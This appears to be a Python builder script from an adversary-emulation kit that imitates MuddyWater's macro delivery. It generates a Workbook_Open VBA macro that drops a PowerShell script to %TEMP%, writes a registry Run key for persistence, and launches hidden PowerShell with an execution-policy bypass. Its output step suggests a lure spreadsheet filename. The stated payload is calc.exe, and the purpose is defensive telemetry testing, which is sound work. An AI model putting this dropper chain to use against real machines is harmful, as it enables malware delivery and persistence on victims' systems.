#!/usr/bin/env python3
"""
============================================================================
ESINTA EMULATION — AUTHORIZED SECURITY TESTING ONLY

This code replicates documented malware behavior for defensive security
testing and endpoint telemetry validation. It does NOT contain real malware
payloads, exploits, or evasion techniques.

LEGAL: Only run this in environments you own or have explicit written
authorization to test. Unauthorized use may violate computer fraud laws.

Final payload: calc.exe (safe, benign)
C2: Local network only (hardcoded private IP: 192.168.0.148)
============================================================================

MuddyCalc Payload Builder

Reads the POWERSTATS emulation (powerstats.ps1) and generates:

1. The final update_check.vbs (launches PowerShell with -File)
2. The final macro.vba (drops VBS + PS1 to %TEMP%, executes VBS)

The macro drops the PowerShell script as a plain .ps1 file to %TEMP%
and the VBScript launches it with -File. This avoids base64 encoding
and string literal length limits in VBA/StarBasic.

Usage:
    python3 encode_payload.py

Reads:  ../stage3-powerstats/powerstats.ps1
Output: Writes ../stage2-persistence/update_check.vbs
        Writes macro.vba
"""

import os
import sys

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
POWERSTATS_PATH = os.path.join(
    SCRIPT_DIR, "..", "stage3-powerstats", "powerstats.ps1"
)
VBS_OUTPUT_PATH = os.path.join(
    SCRIPT_DIR, "..", "stage2-persistence", "update_check.vbs"
)
MACRO_OUTPUT_PATH = os.path.join(SCRIPT_DIR, "macro.vba")


def ps_line_to_vba_print(line):
    """Convert a PowerShell line to a VBA Print # statement.

    Handles double quotes via Chr(34) concatenation and replaces
    em dashes with ASCII equivalents for ANSI compatibility.
    """
    # Replace Unicode em/en dashes with ASCII
    line = line.replace("\u2014", "--")
    line = line.replace("\u2013", "-")

    if '"' in line:
        escaped = line.replace('"', '" & q & "')
        return '    Print #fileNum, "' + escaped + '"'
    else:
        return '    Print #fileNum, "' + line + '"'


def generate_vbs():
    """Generate the final update_check.vbs (one-line launcher).

    Registry persistence is handled by the macro directly.
    Uses inline CreateObject to avoid Set/variable issues across
    different VBScript host configurations.
    wsh.Run auto-expands %TEMP% in the command string.
    """
    lines = [
        r'CreateObject("WScript.Shell").Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File %TEMP%\update_check.ps1", 0',
    ]
    return "\n".join(lines) + "\n"


def generate_macro(ps_script):
    """Generate the final macro.vba that drops VBS + PS1 to %TEMP%.

    Uses native Basic file I/O (Open/Print/Close) for consistent ANSI
    encoding on Windows. Each PS1 line is written individually to avoid
    string literal length limits in VBA/StarBasic.
    """
    ps_lines = ps_script.splitlines()

    lines = [
        "' ============================================================================",
        "' ESINTA EMULATION -- AUTHORIZED SECURITY TESTING ONLY",
        "'",
        "' MuddyCalc Stage 1 -- Workbook_Open Macro",
        "' Emulates: MuddyWater macro delivery (CISA AA22-055A)",
        "' MITRE: T1204.002 (User Execution), T1059.005 (VBScript)",
        "'",
        "' Final payload: calc.exe (safe, benign)",
        "' C2: Local network only (hardcoded private IP: 192.168.0.148)",
        "' ============================================================================",
        "",
        "Sub Workbook_Open()",
        "    Dim wsh As Object",
        "    Dim tempDir As String",
        "    Dim vbsPath As String",
        "    Dim ps1Path As String",
        "    Dim fileNum As Integer",
        "    Dim q As String",
        "",
        "    ' q = double-quote character for building strings with quotes",
        "    q = Chr(34)",
        "",
        '    Set wsh = CreateObject("WScript.Shell")',
        '    tempDir = wsh.ExpandEnvironmentStrings("%TEMP%")',
        r'    vbsPath = tempDir & "\update_check.vbs"',
        r'    ps1Path = tempDir & "\update_check.ps1"',
        "",
        "    ' --- Drop PowerShell script to %TEMP% (T1059.001) ---",
        "    fileNum = FreeFile",
        "    Open ps1Path For Output As #fileNum",
    ]

    # Write each PS1 line as a Print statement
    for ps_line in ps_lines:
        lines.append(ps_line_to_vba_print(ps_line))

    lines.extend([
        "    Close #fileNum",
        "",
        "    ' --- Registry persistence (T1547.001) - SAFE: value is calc.exe ---",
        '    wsh.RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\UpdateCheck", "calc.exe", "REG_SZ"',
        "",
        "    ' --- Drop VBScript to %TEMP% (T1059.005) ---",
        "    ' One-line VBS: inline CreateObject, no Set/variables",
        "    fileNum = FreeFile",
        "    Open vbsPath For Output As #fileNum",
        r'    Print #fileNum, "CreateObject(" & q & "WScript.Shell" & q & ").Run " & q & "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File %TEMP%\update_check.ps1" & q & ", 0"',
        "    Close #fileNum",
        "",
        "    ' --- Execute dropped VBScript (T1059.005) ---",
        '    wsh.Run "wscript.exe " & q & vbsPath & q, 0, False',
        "",
        "    Set wsh = Nothing",
        "End Sub",
    ])

    return "\n".join(lines) + "\n"


def main():
    # Read PowerShell script
    if not os.path.exists(POWERSTATS_PATH):
        print(f"ERROR: PowerShell script not found: {POWERSTATS_PATH}")
        sys.exit(1)

    with open(POWERSTATS_PATH, "r") as f:
        ps_script = f.read()

    print("=" * 70)
    print("ESINTA EMULATION -- MuddyCalc Payload Builder")
    print("=" * 70)
    print()
    print(f"Source:  {os.path.basename(POWERSTATS_PATH)}")
    print(f"Size:    {len(ps_script)} bytes ({len(ps_script.splitlines())} lines)")
    print()

    # Generate final update_check.vbs
    vbs_content = generate_vbs()
    with open(VBS_OUTPUT_PATH, "w") as f:
        f.write(vbs_content)
    print(f"Generated: {os.path.relpath(VBS_OUTPUT_PATH, SCRIPT_DIR)}")

    # Generate final macro.vba
    macro_content = generate_macro(ps_script)
    with open(MACRO_OUTPUT_PATH, "w") as f:
        f.write(macro_content)
    print(f"Generated: {os.path.relpath(MACRO_OUTPUT_PATH, SCRIPT_DIR)}")

    print()
    print(f"Macro: {len(macro_content.splitlines())} lines")
    print()
    print("Next steps:")
    print("  1. Open the .xlsx in LibreOffice Calc")
    print("  2. Tools -> Macros -> Organize Dialogs -> BASIC")
    print(f"     Paste the contents of {os.path.basename(MACRO_OUTPUT_PATH)}")
    print("  3. Save As -> .xlsm format")
    print(
        "     Name: Q4_2025_ExpenseReport_FINAL_FINAL_v3_DO_NOT_DELETE.xlsm"
    )


if __name__ == "__main__":
    main()
